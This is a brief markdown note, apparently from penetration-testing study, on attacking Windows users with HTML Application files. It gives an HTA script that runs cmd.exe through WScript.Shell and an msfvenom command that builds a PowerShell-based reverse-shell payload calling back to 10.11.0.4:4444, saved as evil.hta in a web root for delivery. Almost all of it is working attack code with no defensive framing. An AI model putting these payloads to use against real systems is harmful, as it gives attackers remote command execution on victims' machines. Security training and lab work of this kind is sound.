# HTML application  

hta file  

```
<html>
<body>

<script>

  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);
  
</script>

</body>
</html>
```  

Using msfvenom based on powershell.  

`sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta`  

